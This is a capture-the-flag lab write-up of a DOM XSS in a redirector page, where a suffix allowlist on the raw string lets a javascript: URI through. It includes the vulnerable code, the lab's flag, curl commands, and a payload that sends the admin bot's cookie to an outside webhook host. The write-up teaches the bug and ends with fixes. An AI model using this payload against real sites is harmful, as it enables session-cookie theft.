# Trusted Tail Pwnbox Lab - Suffix Allowlist JavaScript URI XSS

Date: 2026-07-08
Target type: CTF/lab
Bug class: DOM XSS, redirect validation failure, JavaScript URI execution, admin bot cookie exfil

## Observation

Redirector app at `https://f194872f17ec.pwnbox-lab.com/`.

Initial page hints:

- "This page forwards you to our trusted domains. Everything else is rejected."
- `allowlist = [ ".pwnbox-lab.com" ]`
- `param = ?l=<url>`
- `source = /statics/main.js`
- A modal form reports a suspicious URL for admin review.

Relevant client-side code from `main.js`:

```javascript
var p = function () {
  const s = new URLSearchParams(location.search);
  const p = {};
  s.forEach((v, k) => {
    (v.indexOf("https:") > -1) ? p[k] = v : void 0;
  });
  return p;
}

var u = function (e) {
  if (!e) return !1;
  var n = /^https?:\/\//i.test(e) ? (new URL(e)).host : e;
  return [".pwnbox-lab.com"].some((function (e) {
    return n.endsWith(e)
  }))
}

u(p().l) ? location.href = p().l : false;
```

## Hypothesis

If the code only requires the substring `https:` anywhere in the value, and the allowlist check uses `endsWith(".pwnbox-lab.com")` on the whole string when the value is not `http(s)://`, then a `javascript:` URI can likely be shaped to satisfy both checks and execute script.

## Evidence

### The input filter is not a scheme check

The query parser accepts any value containing `https:`:

```javascript
v.indexOf("https:") > -1
```

This does not require `https:` to appear at the start of the URL.

### The allowlist trusts the wrong end of the string

When the value does not begin with `http://` or `https://`, the validator does **not** parse it with `new URL()`. It uses the raw string:

```javascript
var n = /^https?:\/\//i.test(e) ? (new URL(e)).host : e;
```

That means a value such as:

```text
javascript:alert(1)//https:.pwnbox-lab.com
```

is validated as a plain string and passes because it ends with `.pwnbox-lab.com`.

### Local proof of the validator logic

Confirmed in-browser:

```javascript
u("javascript:alert(1)//https:.pwnbox-lab.com") === true
```

### Same-origin admin report path exists

Posting a same-origin URL to `/` returned:

```text
URL reported — an admin will review it shortly.
```

External `javascript:` submitted directly in the form failed, but a same-origin page URL carrying the payload in `?l=` was accepted.

## Test

Direct page-level XSS:

```bash
curl -sS "https://f194872f17ec.pwnbox-lab.com/?l=javascript%3Aalert%281%29//https%3A.pwnbox-lab.com"
```

Reported admin-bot payload:

```text
https://f194872f17ec.pwnbox-lab.com/?l=javascript:fetch('https://webhook.site/[uuid]?c='+encodeURIComponent(document.cookie))//https:.pwnbox-lab.com
```

Submission:

```bash
curl -sS -X POST "https://f194872f17ec.pwnbox-lab.com/" \
  -d "url=https://f194872f17ec.pwnbox-lab.com/?l=javascript%3Afetch%28%27https%3A//webhook.site/[uuid]%3Fc%3D%27%2BencodeURIComponent%28document.cookie%29%29//https%3A.pwnbox-lab.com"
```

## Result

Webhook received:

```text
flag=pwnbox{e6f9b1d02eb54e239f12cbbee34b51aa}
```

The execution chain was:

```text
attacker-controlled ?l value
-> substring "https:" passes parser gate
-> raw string endsWith(".pwnbox-lab.com") passes allowlist
-> location.href assigned to javascript: URI
-> admin bot executes script
-> document.cookie exfiltrated
```

## Conclusion

Confirmed DOM XSS caused by using a suffix allowlist on the full redirect string instead of on a parsed hostname, combined with a weak substring-based `https:` gate. The admin review feature provides the victim context needed to extract the flag cookie.

## Root Cause

- The parser treats `https:` as a substring signal instead of validating the actual scheme.
- The allowlist compares the tail of the raw string when the value is not `http(s)://`.
- The sink is `location.href = p().l`, which executes `javascript:` URIs.

## Failed Assumptions

- The visible `.pwnbox-lab.com` allowlist is not host-based when the value is non-HTTP.
- Requiring `https:` somewhere in the string does not prevent active schemes.

## Working Theory

The developer intended to allow only trusted redirects, but validated the wrong component. Appending a trusted-looking suffix after a `javascript:` URI preserves executable behavior while satisfying the string checks.

## Flag

`pwnbox{e6f9b1d02eb54e239f12cbbee34b51aa}`

## Fix

- Parse with `new URL()` before any allowlist decision.
- Require `protocol` to be exactly `https:` or `http:` as intended.
- Compare `hostname` against an exact allowlist or normalized suffix policy.
- Reject `javascript:`, `data:`, and other non-navigation schemes before assignment.
- Avoid assigning untrusted strings directly to `location.href`.
